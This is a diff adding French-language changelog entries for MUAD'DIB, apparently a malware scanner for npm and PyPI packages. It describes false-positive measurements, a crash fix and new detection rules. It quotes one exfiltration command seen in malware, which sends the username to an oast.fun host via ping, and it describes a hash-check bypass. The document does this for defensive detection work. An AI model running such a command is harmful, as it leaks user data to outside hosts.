@@ -5,6 +5,147 @@ All notable changes to MUAD'DIB will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.10.95] - 2026-04-18
+
+### Context
+
+Release honnete suite a un cycle de review FP qui a identifie 8 clusters de FP dans
+le rapport `data/fp-analysis-week-2026-04-10-17.md`. Un premier plan d'ajustements
+avait ete conçu mais le diagnostic empirique (mesure FPR avant/apres sur les 545
+packages benign curated) a montre qu'aucun ajustement ne delivrait le critere de
+merge du plan (`delta_curated_pp <= -1.0`). Cette release conserve uniquement les
+elements orthogonaux qui ne dependent pas de l'ajustement FP original, et documente
+honnetement l'absence de gain mesure.
+
+### Fixed — Windows EPERM crash during `muaddib evaluate`
+
+Le workflow `node bin/muaddib.js evaluate` sur Windows crashait au premier package
+qui declenchait EPERM (locked file, long path, antivirus). Exemple observe sur `ejs`
+au package 369/548 : le `fs.rmSync(pkgCacheDir, { recursive: true, force: true })`
+de cleanup apres une erreur d'extraction remontait l'exception non-catchee jusqu'au
+top-level catch de `bin/muaddib.js:608`, tuant l'evaluation entiere.
+
+- `src/commands/evaluate.js` — 8 occurrences de `fs.rmSync(pkgCacheDir, ...)` dans
+  `downloadAndExtract` et `downloadAndExtractPyPI` enveloppees dans try/catch
+  silencieux. Un cleanup qui rate sur Windows ne doit pas tuer une run de 545
+  packages.
+- `src/commands/evaluate.js` — les trois boucles d'evaluation benign (`evaluateBenign`,
+  `evaluateBenignPyPI`, `evaluateBenignRandom`) wrappent maintenant `downloadAndExtract`
+  et `silentScan` en try/catch. Un package qui plante (EPERM, long path, file lock) est
+  marque `skipped++` avec l'erreur dans `details[].error` et l'eval continue. Les FPR
+  restent calculees sur `scanned = total - skipped` donc la mesure reste honnete.
+
+### Changed — `hasHashVerification` heuristique durcie (pas d'impact FPR mesure)
+
+`ctx.hasHashVerification` dans `src/scanner/ast.js:211` etait une regex simple
+`createHash + digest`. Un attaquant pouvait declencher le downgrade CRITICAL → HIGH
+de `download_exec_binary` avec juste `crypto.createHash('sha256').update(buf).digest('hex')`
+sans jamais comparer le resultat. Bypass a 3 lignes.
+
+- `src/scanner/ast.js:211` — la regex exige maintenant aussi la presence d'un
+  operateur de comparaison dans le meme fichier (`===`, `!==`, `.equals(`,
+  `assert.strictEqual/equal/deepEqual/deepStrictEqual`, `throw`). Commentaire
+  explicite au-dessus du check documente que c'est une heuristique best-effort
+  niveau fichier, pas une preuve que le hash est reellement consomme. Un fix proper
+  (taint-tracking function-scope) est differe a un PR dedie.
+
+Impact mesure sur le corpus benign 545 packages : **0 FPR delta**. Le durcissement ne
+reclassifie personne (tous les packages avec `createHash + digest` avaient aussi une
+comparaison visible quelque part). Le gain est defensif : une exploitation future ne
+peut plus simplement fake `createHash(...).digest(...)` sans commitment.
+
+### Abandoned — triple-gate downgrade CRITICAL→MEDIUM
+
+Un plan initial proposait un downgrade MEDIUM quand `download_exec_binary` co-occurre
+avec `hasHashVerification=true` ET `fetchOnlySafeDomains=true` (all URLs on
+github/npm/nodejs/pypi). Hypothese : ~180 packages Cluster A legitimes (electron,
+sharp, @spencer-kit/aor, etc.) beneficieraient du downgrade.
+
+**Diagnostic empirique** (v2.10.94 vs triple-gate applique, meme machine, meme corpus) :
+
+- FPR curated : 15.60% → 15.60% (0.00 pp)
+- FPR random : 7.00% → 7.00% (0.00 pp)
+- FPR after ML : 10.28% → 10.28% (0.00 pp)
+- TPR@3 : 93.85% → 93.85% (0.00 pp)
+- ADR : 96.26% → 96.26% (0.00 pp)
+
+Cause racine (analyse sur 85 benign packages flagges) : `download_exec_binary` fire
+sur **3 packages** seulement (esbuild, yarn, @backstage/create-app). Les deux derniers
+etaient deja LOW. esbuild score 100 mais son score est domine par d'autres rules
+CRITICAL (`lifecycle_file_exec`, `lifecycle_dataflow`, etc.), pas par
+`download_exec_binary`. Le downgrade de cette rule a donc 0 impact.
+
+Les vrais drivers FP sur les 85 flagged sont le cumul de `high_entropy_string` (153),
+`prototype_hook` (146), `string_mutation_obfuscation` (131), `prototype_pollution`
+(118), `credential_regex_harvest` (115), `dynamic_require:HIGH` (81). Ce bruit exige
+un redesign plus fondamental (probablement niveau scoring des combinaisons LOW, ou
+whitelist framework) qui sortira d'un v2.10.96 dedie. Full diagnostic dans
+`data/fp-v2.10.95-validation.md` (prive, gitignored).
+
+### Tests
+
+- 3 232 → **3 236** tests passes, 0 failed. 4 nouveaux tests pour `download_exec_binary` :
+  (1) sans hash → CRITICAL regression, (2) hash sans comparaison → CRITICAL (nouveau
+  gate), (3) hash avec comparaison → HIGH (comportement preserve), (4) hash avec
+  comparaison + URL non-allowliste → HIGH (regression).
+
+## [2.10.94] - 2026-04-17
+
+### Added — Validation empirique des malwares sous-threshold (rescan VPS)
+
+Apres la v2.10.93 qui ajoutait les regles ltidi/csec/OAST/self_destruct_eval, un
+rescan empirique sur les tarballs reels de la semaine 2026-04-10→17 a mesure les
+scores effectifs et identifie 4 gaps restants :
+
+| Malware | v2.10.93 score | Cause du gap |
+|---------|----------------|--------------|
+| ltidi cmp-api-stub | 35 (cap MT-1) | `dependency_url_suspicious` n'est pas dans HC_TYPES, MT-1 ceiling cappe a 35 |
+| csec-crypto-toolkit | 19 | `self_destruct_eval` ne matche pas car `unlinkSync(__filename)` est dans le string XOR, pas dans le source |
+| apache-arrow-14 | 50 | Floor CRITICAL a 50 mais pas de mecanisme pour pousser au-dessus |
+| koa-v3 | 9 | `curl_env_exfil` ne couvre que curl/wget, pas ping/nslookup/dig |
+
+### Four scoped fixes
+
+- `src/scanner/package.js` — nouveau threat type `external_tarball_dep` (CRITICAL)
+  emit a la place de `dependency_url_suspicious` quand l'URL pointe vers une tarball
+  (.tgz/.tar.gz/.tar.bz2/.zip) sur un host non-allowlist (cloud storage, CDN random).
+  Ajoute a `HIGH_CONFIDENCE_MALICE_TYPES` pour bypass le MT-1 score ceiling.
+- `src/scanner/ast-detectors/handle-new-expression.js` — nouveau threat type
+  `function_runtime_args` (CRITICAL, AST-090) emit quand `new Function()` recoit >= 2
+  literal args runtime (`require`, `__dirname`, `__filename`, `module`, `exports`,
+  `process`) + body dynamique + presence d'obfuscation dans le meme fichier
+  (`hasFromCharCode || hasBase64Decode || hasZlibInflate`). Le gating obfuscation
+  evite les FP sur les wrappers CommonJS legitimes (babel-register, ts-node, pirates,
+  jest, nyc, vitest). Ajoute a HC_TYPES.
+- `src/scanner/package.js` — `curl_env_exfil` etend son regex pour inclure
+  `ping|nslookup|dig|host|getent`, catchant koa-v3 qui utilise `ping -c 1 $(whoami).<hex>.oast.fun`.
+- `src/scoring.js` — nouveau floor a 75 quand 2+ threat types DISTINCTS sont CRITICAL
+  package-level (ex : `curl_env_exfil` + `lifecycle_env_exfil` compound). Co-occurrence
+  2 CRITICAL package-level = signature quasi-certaine de malware.
+
+### Rule IDs added
+
+- `MUADDIB-AST-090` : `function_runtime_args` — new Function() avec runtime args +
+  obfuscation (csec pattern)
+- `MUADDIB-PKG-020` : `external_tarball_dep` — dep URL tarball sur host third-party
+  (ltidi chain)
+
+### Rescan empirique v2.10.93 → v2.10.94 (mesure sur tarballs reels VPS)
+
+| Malware | v2.10.93 | v2.10.94 | ≥75 CRITICAL? |
+|---------|----------|----------|---------------|
+| ltidi cmp-api-stub | 35 | 50 | Non, mais au-dessus ADR 20 |
+| csec-crypto-toolkit@4.2.4 | 19 | **88** | Oui |
+| apache-arrow-14 | 50 | 75 | Oui |
+| koa-v3 | 9 | 75 | Oui |
+| ourin-baileys (hors scope) | 41 | 46 | Non, reste a design |
+
+### Tests
+
+- 3 230 → **3 232** tests passes, 0 failed. 2 nouveaux tests `function_runtime_args` :
+  positif csec-style (XOR+charcode+runtime args → CRITICAL), negatif module wrapper
+  legit (ts-node-style sans obfuscation → pas d'emission).
+
 ## [2.10.93] - 2026-04-17
 
 ### Added — Security review 2026-04-10→17 remediation
